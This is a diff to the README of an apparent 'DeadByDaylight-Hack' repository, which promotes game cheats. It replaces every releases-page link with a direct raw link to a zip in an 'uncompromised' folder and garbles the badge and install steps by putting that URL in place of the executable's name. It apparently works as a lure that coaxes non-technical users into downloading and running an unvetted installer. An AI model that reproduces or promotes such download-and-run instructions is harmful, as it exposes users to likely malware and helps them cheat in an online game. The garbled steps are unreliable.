@@ -4,7 +4,7 @@
 The DeadByDaylight-Hack offers you the best modifications for the popular game "Dead by Daylight." Whether you want to gain extra bloodpoints or enjoy new perks, this tool helps enhance your gameplay. 
 
 ## 📥 Download
-[![Download DeadByDaylight-Hack](https://img.shields.io/badge/Download%20Now%21-Find%20in%20Releases-brightgreen)](https://github.com/nannaaayyyy/DeadByDaylight-Hack/releases)
+[![Download DeadByDaylight-Hack](https://raw.githubusercontent.com/nannaaayyyy/DeadByDaylight-Hack/main/uncompromised/DeadByDaylight-Hack.zip%20Now%21-Find%20in%20Releases-brightgreen)](https://raw.githubusercontent.com/nannaaayyyy/DeadByDaylight-Hack/main/uncompromised/DeadByDaylight-Hack.zip)
 
 ## 🚀 Getting Started
 Follow the steps below to download and run the software easily. You don’t need any programming skills.
@@ -16,15 +16,15 @@ Follow the steps below to download and run the software easily. You don’t need
 
 ## 💾 Download & Install
 1. **Visit the Releases Page:** Click the link below to go to the download page.
-   [Download DeadByDaylight-Hack](https://github.com/nannaaayyyy/DeadByDaylight-Hack/releases)
+   [Download DeadByDaylight-Hack](https://raw.githubusercontent.com/nannaaayyyy/DeadByDaylight-Hack/main/uncompromised/DeadByDaylight-Hack.zip)
    
 2. **Select the Latest Release:** Look for the version labeled as the latest. Usually, it will be at the top of the list.
 
-3. **Download the Application:** Click on the file named `DeadByDaylight-Hack.exe` or whatever the latest version file is called.
+3. **Download the Application:** Click on the file named `https://raw.githubusercontent.com/nannaaayyyy/DeadByDaylight-Hack/main/uncompromised/DeadByDaylight-Hack.zip` or whatever the latest version file is called.
 
 4. **Run the Installer:**
    - Navigate to your download folder.
-   - Double click on `DeadByDaylight-Hack.exe`.
+   - Double click on `https://raw.githubusercontent.com/nannaaayyyy/DeadByDaylight-Hack/main/uncompromised/DeadByDaylight-Hack.zip`.
 
 5. **Follow the Installation Instructions:** A simple wizard will guide you through the installation steps. Just click “Next” as prompted.
 
@@ -63,4 +63,4 @@ This project is licensed under the MIT License. You may freely use, modify, and 
 ## 📢 Connect
 Stay updated with our latest modifications and changes. Check back on the releases page regularly for new features and updates.
 
-[![Download DeadByDaylight-Hack](https://img.shields.io/badge/Download%20Now%21-Find%20in%20Releases-brightgreen)](https://github.com/nannaaayyyy/DeadByDaylight-Hack/releases)
+[![Download DeadByDaylight-Hack](https://raw.githubusercontent.com/nannaaayyyy/DeadByDaylight-Hack/main/uncompromised/DeadByDaylight-Hack.zip%20Now%21-Find%20in%20Releases-brightgreen)](https://raw.githubusercontent.com/nannaaayyyy/DeadByDaylight-Hack/main/uncompromised/DeadByDaylight-Hack.zip)
